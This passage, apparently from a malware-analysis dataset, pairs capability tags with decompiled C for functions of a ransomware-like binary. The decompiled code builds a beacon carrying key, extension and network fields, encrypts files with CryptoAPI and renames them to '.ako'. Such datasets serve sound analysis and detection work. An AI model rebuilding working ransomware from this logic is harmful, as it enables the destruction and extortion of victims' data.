cVar1 = fcn.00404d10();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.00404d10(),  cVar1 == '\\0')) {\n        fcn.004057c0();\n        fcn.00402210(arg_8h, &var_60h);\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            fcn.00405580(&var_60h);\n            fcn.00405750(0x485984);\n            uVar2 = fcn.00403490(&var_114h);\n            puVar4 = &var_fch;\n            uVar2 = fcn.00403940(puVar4, uVar2);\n            uVar2 = fcn.00407ac0(&var_e4h, \"\\\"ext\\\":\\\"\", uVar2);\n            uVar2 = fcn.00407bd0(&var_cch, uVar2, puVar4);\n            fcn.00405560(uVar2);\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.00404f30();\n            arg_10h = 0x485994;\n            uVar2 = fcn.004079f0(&var_144h, \"\\\"key\\\":\\\"\", &var_60h);\n            uVar2 = fcn.00407bd0(&var_12ch, uVar2, arg_10h);\n            fcn.00405560(uVar2);\n            fcn.004055f0();\n            fcn.004055f0();\n            uVar2 = fcn.00403330(0x4859a0);\n            puVar4 = &var_18ch;\n            uVar2 = fcn.00403940(puVar4, uVar2);\n            uVar2 = fcn.00407ac0(&var_174h, \"\\\"network\\\":\\\"\", uVar2);\n            uVar2 = fcn.00407bd0(&var_15ch, uVar2, puVar4);\n            fcn.00405560(uVar2);\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            uVar2 = fcn.00403310(0x4859b0);\n            puVar4 = &var_1d4h;\n            uVar2 = fcn.00403940(puVar4, uVar2);\n            uVar2 = fcn.00407ac0(&var_1bch, \"\\\"subid\\\":\\\"\", uVar2);\n            uVar2 = fcn.00407bd0(&var_1a4h, uVar2, puVar4);\n            fcn.00405560(uVar2);\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            uVar2 = fcn.00402ed0(&var_234h);\n            puVar4 = &var_21ch;\n            uVar2 = fcn.00403940(puVar4, uVar2);\n            uVar2 = fcn.00407ac0(&var_204h, \"\\\"lang\\\":\\\"\", uVar2);\n            uVar2 = fcn.00407bd0(&var_1ech, uVar2, puVar4);\n            fcn.00405560(uVar2);\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.004055f0();\n            fcn.00404f30();\n            in_stack_fffffd30 = \"\\\"ver\\\":\\\"1.1.1\\\"\";\n            fcn.00405540(\"\\\"ver\\\":\\\"1.1.1\\\"\");\n            fcn.00405540(0x4859e0);\n            fcn.004057c0();\n            fcn.00402210(&var_30h, &var_48h);\n            cVar1 = fcn.00404d10();\n            if (cVar1 == '\\0') {\n                stack0xffffff94 = 0;\n                while (uVar3 = fcn.00404d90(),  stack0xffffff94 < uVar3) {\n                    if ((stack0xffffff94 != 0) && (stack0xffffff94 % 0x3f == 0)) {\n                        fcn.00405350(stack0xffffff94, 0x4859e4, 1);\n                        *NULL = stack0xffffff94 + 1;\n                    }\n                    *0x4 = stack0xffffff94 + 1;\n                }\n                fcn.00405750(\"{PATTERN_ID}\");\n                uVar2 = fcn.00401440(&var_48h);\n                fcn.00402e00(&var_84h, uVar2);\n                fcn.004055f0();\n                fcn.00405750(\"{EXT}\");\n                uVar2 = fcn.00403490(&var_264h);\n                uVar2 = fcn.00403940(&var_24ch, uVar2);\n                uVar2 = fcn.00401440(uVar2);\n                fcn.00402e00(&var_9ch, uVar2);\n                fcn.004055f0();\n                fcn.00404f30();\n                fcn.004055f0();\n                fcn.00405750(\"{UID}\");\n                uVar2 = fcn.004032f0();\n                uVar2 = fcn.00403940(&var_27ch, uVar2);\n                uVar2 = fcn.00401440(uVar2);\n                fcn.00402e00(&var_b4h, uVar2);\n                fcn.004055f0();\n                fcn.004055f0();\n                var_6ah._1_1_ = 1;\n                fcn.004055f0();\n                fcn.004055f0();\n                fcn.004055f0();\n                goto code_r0x00402ddc;\n            }\n            fcn.004055f0();\n            fcn.004055f0();\n        }\n        fcn.004055f0();\n    }\ncode_r0x00402ddc:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_fffffd30);\n    return;\n}\n",
        "token_count": 1799
    },
    "00403a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __fastcall fcn.00403a50(code **param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4703b0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    fcn.00401940();\n    var_4h = 0;\n    fcn.004057c0();\n    var_4h._0_1_ = 1;\n    fcn.00405100();\n    var_4h._0_1_ = 2;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x49) = 0;\n    *(param_1 + 0x4a) = 0;\n    iVar1 = fcn.0043a4f7(0x34, arg_8h);\n    var_4h._0_1_ = 3;\n    if (iVar1 == 0) {\n        var_18h = 0;\n    }\n    else {\n        var_18h = fcn.00405cb0(0);\n    }\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    fcn.00405c40(var_18h);\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 452
    },
    "00404170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** __fastcall fcn.00404170(code **param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4703b0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_utf16_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    fcn.00401940();\n    var_4h = 0;\n    fcn.004057c0();\n    var_4h._0_1_ = 1;\n    fcn.00405100();\n    var_4h._0_1_ = 2;\n    *(param_1 + 0x12) = 0;\n    *(param_1 + 0x49) = 0;\n    *(param_1 + 0x4a) = 0;\n    iVar1 = fcn.0043a4f7(0x34, arg_8h);\n    var_4h._0_1_ = 3;\n    if (iVar1 == 0) {\n        var_18h = 0;\n    }\n    else {\n        var_18h = fcn.00405f80(0);\n    }\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    fcn.00405c40(var_18h);\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 453
    },
    "00404b30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00404b30(char *arg_8h)\n\n{\n    char *pcVar1;\n    char **in_ECX;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    if (*in_ECX != arg_8h) {\n        fcn.00406200();\n        if (arg_8h != NULL) {\n            for (var_4h = arg_8h; *var_4h != '\\0'; var_4h = var_4h + 1) {\n            }\n            pcVar1 = fcn.00455a3e(var_4h + (1 - arg_8h));\n            *in_ECX = pcVar1;\n            if (*in_ECX != NULL) {\n                fcn.00451500(*in_ECX, arg_8h, var_4h + (1 - arg_8h));\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 214
    },
    "004059b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004059b0(uint arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_20h;\n    uint arg_8h_00;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint8_t *var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470460;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4ch = 0;\n    fcn.004057c0(var_10h);\n    var_4h = 0;\n    fcn.004057c0();\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    var_58h = arg_ch;\n    if (*(var_48h + 0x48) == '\\0') {\n        var_60h = 0;\n        var_5ch = 0;\n        *(var_48h + 0x40) = 0;\n        *(var_48h + 0x44) = 0;\n    }\n    arg_8h_00 = 8;\n    fcn.00406de0(8, 0);\n    *(var_48h + 0x4c) = 0;\n    do {\n        if (arg_ch == arg_10h) {\n            fcn.004056d0(&var_40h);\n            var_4ch = var_4ch | 1;\n            var_4h = var_4h & 0xffffff00;\n            fcn.004055f0();\n            var_4h = 0xffffffff;\n            fcn.004055f0();\ncode_r0x00405c21:\n            *in_FS_OFFSET = var_ch;\n            fcn.0043a2e7(arg_8h_00);\n            return;\n        }\n        fcn.004076a0(&var_64h);\n        var_50h = fcn.00406250();\n        arg_20h = &var_44h;\n        iVar1 = fcn.00404d90();\n        var_54h = fcn.00401c10(var_48h + 0x40, arg_ch, arg_10h, &arg_ch, var_50h, iVar1 + var_50h, arg_20h);\n        if (var_54h < 0) {\ncode_r0x00405b89:\n            if (*(var_48h + 0x49) != '\\0') {\n                fcn.00405810(var_48h + 0x10);\n                var_4ch = var_4ch | 1;\n                var_4h = var_4h & 0xffffff00;\n                fcn.004055f0();\n                var_4h = 0xffffffff;\n                fcn.004055f0();\n                goto code_r0x00405c21;\n            }\n            fcn.00401550(\"bad conversion\");\n            fcn.00451487(&var_7ch, 0x48f464);\n        }\n        else if (var_54h < 2) {\n            if (var_50h < var_44h) {\n                fcn.00406ee0(var_50h, var_44h - var_50h);\n            }\n            else {\n                uVar2 = fcn.00404d90();\n                if (uVar2 < 0x10) {\n                    fcn.00406de0(8, 0);\n                }\n                else {\n                    if (*(var_48h + 0x49) != '\\0') {\n                        fcn.00405810(var_48h + 0x10);\n                        var_4ch = var_4ch | 1;\n                        var_4h = var_4h & 0xffffff00;\n                        fcn.004055f0();\n                        var_4h = 0xffffffff;\n                        fcn.004055f0();\n                        goto code_r0x00405c21;\n                    }\n                    fcn.00401550(\"bad conversion\");\n                    fcn.00451487(&var_70h, 0x48f464);\n                }\n            }\n        }\n        else {\n            if (var_54h != 3) goto code_r0x00405b89;\n            for (; arg_ch != arg_10h; arg_ch = arg_ch + 2) {\n                fcn.00406de0(1, *arg_ch);\n            }\n        }\n        *(var_48h + 0x4c) = arg_ch - var_58h >> 1;\n    } while( true );\n}\n",
        "token_count": 1191
    },
    "00405ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405ce0(uint arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_20h;\n    uint arg_8h_00;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint8_t *var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4704a0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4ch = 0;\n    fcn.00405100(var_10h);\n    var_4h = 0;\n    fcn.00405100();\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    var_58h = arg_ch;\n    if (*(var_48h + 0x48) == '\\0') {\n        var_60h = 0;\n        var_5ch = 0;\n        *(var_48h + 0x40) = 0;\n        *(var_48h + 0x44) = 0;\n    }\n    arg_8h_00 = 8;\n    fcn.004065c0(8, 0);\n    *(var_48h + 0x4c) = 0;\n    do {\n        if (arg_ch == arg_10h) {\n            fcn.00405010(&var_40h);\n            var_4ch = var_4ch | 1;\n            var_4h = var_4h & 0xffffff00;\n            fcn.00404f30();\n            var_4h = 0xffffffff;\n            fcn.00404f30();\ncode_r0x00405f58:\n            *in_FS_OFFSET = var_ch;\n            fcn.0043a2e7(arg_8h_00);\n            return;\n        }\n        fcn.00407440(&var_64h);\n        var_50h = fcn.00406250();\n        arg_20h = &var_44h;\n        iVar1 = fcn.00404d90();\n        var_54h = fcn.00401bd0(var_48h + 0x40, arg_ch, arg_10h, &arg_ch, var_50h, var_50h + iVar1 * 2, arg_20h);\n        if (var_54h < 0) {\ncode_r0x00405ec0:\n            if (*(var_48h + 0x4a) != '\\0') {\n                fcn.00407620(var_48h + 0x28);\n                var_4ch = var_4ch | 1;\n                var_4h = var_4h & 0xffffff00;\n                fcn.00404f30();\n                var_4h = 0xffffffff;\n                fcn.00404f30();\n                goto code_r0x00405f58;\n            }\n            fcn.00401550(\"bad conversion\");\n            fcn.00451487(&var_7ch, 0x48f464);\n        }\n        else if (var_54h < 2) {\n            if (var_50h < var_44h) {\n                fcn.00407510(var_50h, var_44h - var_50h >> 1);\n            }\n            else {\n                uVar2 = fcn.00404d90();\n                if (uVar2 < 0x10) {\n                    fcn.004065c0(8, 0);\n                }\n                else {\n                    if (*(var_48h + 0x4a) != '\\0') {\n                        fcn.00407620(var_48h + 0x28);\n                        var_4ch = var_4ch | 1;\n                        var_4h = var_4h & 0xffffff00;\n                        fcn.00404f30();\n                        var_4h = 0xffffffff;\n                        fcn.00404f30();\n                        goto code_r0x00405f58;\n                    }\n                    fcn.00401550(\"bad conversion\");\n                    fcn.00451487(&var_70h, 0x48f464);\n                }\n            }\n        }\n        else {\n            if (var_54h != 3) goto code_r0x00405ec0;\n            for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n                fcn.004065c0(1, *arg_ch);\n            }\n        }\n        *(var_48h + 0x4c) = arg_ch - var_58h;\n    } while( true );\n}\n",
        "token_count": 1193
    },
    "00405ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405ff0(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint arg_ch;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.00406300(param_1);\n    piVar1 = fcn.004072d0();\n    if (*piVar1 != 0) {\n        puVar2 = fcn.00404940();\n        uVar3 = *puVar2;\n        puVar2 = fcn.004072d0();\n        fcn.00407320(*puVar2, uVar3);\n        arg_ch = fcn.00407350();\n        puVar2 = fcn.004072d0();\n        uVar3 = *puVar2;\n        fcn.00404960();\n        fcn.00407380(uVar3, arg_ch);\n        puVar2 = fcn.004072d0();\n        *puVar2 = 0;\n        puVar2 = fcn.00404940();\n        *puVar2 = 0;\n        puVar2 = fcn.00405fb0();\n        *puVar2 = 0;\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "00406200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406200(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.004557fb(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 65
    },
    "00407fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407fc0(uint16_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffed8;\n    int32_t var_11ch;\n    uint16_t *var_118h;\n    uchar var_111h;\n    uint var_110h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470550;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if ((arg_18h != 0) && (arg_ch != 0)) {\n        fcn.004080f0(var_10h);\n        in_stack_fffffed8 = arg_14h + arg_18h * 2;\n        cVar1 = fcn.00408f70(arg_14h, in_stack_fffffed8);\n        if (cVar1 == '\\0') {\n            var_111h = 0;\n            fcn.004098b0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            var_11ch = arg_ch + -1;\n            piVar2 = fcn.00407940(&arg_10h, &var_11ch);\n            var_118h = arg_8h + *piVar2;\n            while ((cVar1 = fcn.00408f30(*var_118h),  cVar1 == '\\0' && (var_118h != arg_8h))) {\n                var_118h = var_118h + -1;\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_fffffed8);\n    return;\n}\n",
        "token_count": 480
    },
    "00408490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408490(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    uVar1 = fcn.004254da(*(arg_8h + 4));\n    *(in_ECX + 4) = uVar1;\n    if (arg_ch != 0) {\n        uVar1 = fcn.00401800();\n        fcn.00401910(arg_ch, uVar1);\n        *(*(in_ECX + 4) + 0x10) = 0;\n        fcn.00404b30(0x4821d4);\n    }\n    return in_ECX;\n}\n",
        "token_count": 164
    },
    "00409000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409000(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint arg_ch_00;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.00406300();\n    piVar1 = fcn.004072d0();\n    if (*piVar1 != 0) {\n        puVar2 = fcn.00404940();\n        uVar3 = *puVar2;\n        puVar2 = fcn.004072d0();\n        fcn.00407320(*puVar2, uVar3);\n        arg_ch_00 = fcn.00407350();\n        puVar2 = fcn.004072d0();\n        uVar3 = *puVar2;\n        fcn.00404960();\n        fcn.00407380(uVar3, arg_ch_00);\n    }\n    piVar1 = fcn.004072d0();\n    *piVar1 = arg_8h;\n    piVar1 = fcn.00404940();\n    *piVar1 = arg_ch * 0x18 + arg_8h;\n    piVar1 = fcn.00405fb0();\n    *piVar1 = arg_10h * 0x18 + arg_8h;\n    return;\n}\n",
        "token_count": 308
    },
    "004098b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004098b0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((arg_18h == 0) || (arg_ch == 0)) {\ncode_r0x0040991f:\n        iVar2 = -1;\n    }\n    else {\n        var_8h = arg_ch + -1;\n        piVar1 = fcn.00407940(&arg_10h, &var_8h);\n        var_4h = arg_8h + *piVar1 * 2;\n        while (iVar2 = fcn.00409ef0(arg_14h, arg_18h, var_4h),  iVar2 == 0) {\n            if (var_4h == arg_8h) goto code_r0x0040991f;\n            var_4h = var_4h + -2;\n        }\n        iVar2 = var_4h - arg_8h >> 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 278
    },
    "004099b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004099b0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = arg_8h + 0x23;\n    if (var_4h <= arg_8h) {\n        var_4h = 0xffffffff;\n    }\n    iVar1 = fcn.00401450(var_4h);\n    if (iVar1 == 0) {\n        fcn.004559ed();\n    }\n    uVar2 = iVar1 + 0x23U & 0xffffffe0;\n    *(uVar2 - 4) = iVar1;\n    return uVar2;\n}\n",
        "token_count": 176
    },
    "0040a130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a130(uint arg_8h, int32_t *arg_ch, char *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    piVar1 = fcn.0045652e();\n    arg_8h_00 = fcn.00404db0();\n    *piVar1 = 0;\n    iVar2 = fcn.00456489(arg_8h_00, &var_8h, arg_10h);\n    if (arg_8h_00 == var_8h) {\n        arg_10h = \"invalid stoi argument\";\n        fcn.00425726(\"invalid stoi argument\");\n    }\n    if ((*piVar1 == 0x22) || (iVar2 < -0x80000000)) {\n        fcn.00425766(\"stoi argument out of range\");\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_8h - arg_8h_00 >> 1;\n    }\n    fcn.0043a2e7(arg_10h);\n    return;\n}\n",
        "token_count": 314
    },
    "0040a250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a250(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_38h;\n    uint var_34h;\n    uint var_2eh;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4705b0;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040a250::var_ch;\n    arg_8h_00 = 0x40a283;\n    var_10h = uVar2;\n    cVar1 = fcn.00404d10(uVar2);\n    if (((cVar1 == '\\0') && (arg_ch != 0)) && (*in_ECX != 0)) {\n        arg_8h_00 = 0x40a2a3;\n        cVar1 = fcn.00404d10(uVar2);\n        if (cVar1 == '\\0') {\n            arg_8h_00 = fcn.00401440(arg_8h);\n            cVar1 = fcn.0040a650(arg_8h_00);\n            if (cVar1 == '\\0') {\n                if (arg_ch == 3) {\n                    uVar3 = fcn.00401440(arg_8h);\n                    fcn.0040a4c0(uVar3);\n                }\n                else {\n                    var_2eh._0_1_ = 0;\n                    var_14h = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_CryptDuplicateKey)(*in_ECX, 0, 0, &fcn.0040a250::var_14h);\n                    if (iVar4 != 0) {\n                        uVar3 = fcn.00404db0();\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(uVar3);\n                        uVar3 = fcn.00404db0(uVar2 & 0xfffffffe);\n                        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(uVar3);\n                        uVar3 = fcn.00404db0(0xc0000000, 0, 0, 3, 0x80, 0);\n                        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar3);\n                        if (iVar4 != -1) {\n                            cVar1 = fcn.0040a770(var_14h, iVar4, arg_ch);\n                            if (cVar1 == '\\0') {\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                            }\n                            else {\n                                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                                fcn.0040ada0(&fcn.0040a250::var_2eh + 2, arg_8h, L\".ako\");\n                                uVar3 = fcn.00404db0(1);\n                                uVar3 = fcn.00404db0(uVar3);\n                                iVar4 = (*_sym.imp.KERNEL32.dll_MoveFileExW)(uVar3);\n                                var_2eh._0_1_ = iVar4 != 0;\n                                var_2eh._1_1_ = var_2eh;\n                                fcn.00404f30();\n                            }\n                        }\n                        (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(var_14h);\n                    }\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 892
    },
    "0040a410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040a410(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint32_t uVar2;\n    uchar *puVar3;\n    int32_t *in_FS_OFFSET;\n    uchar auStackY256 [172];\n    uint uStackY84;\n    uint arg_ch_00;\n    uint arg_10h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470160;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040a410::var_ch;\n    if ((arg_ch < 0) || ((arg_ch < 1 && (arg_8h == 0)))) {\n        puVar3 = &stack0xffffff00;\n    }\n    else {\n        fcn.0046fff0();\n        iVar1 = fcn.0046fff0();\n        arg_10h = 10;\n        arg_ch_00 = 0;\n        arg_8h_00 = fcn.00403430();\n        uStackY84 = 0x40a47f;\n        uVar2 = fcn.0040a130(arg_8h_00, arg_ch_00, arg_10h);\n        var_10h = uVar2 < iVar1;\n        puVar3 = uVar2 & 0xffffff00 | var_10h;\n    }\n    *in_FS_OFFSET = var_ch;\n    return puVar3;\n}\n",
        "token_count": 383
    },
    "0040a770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
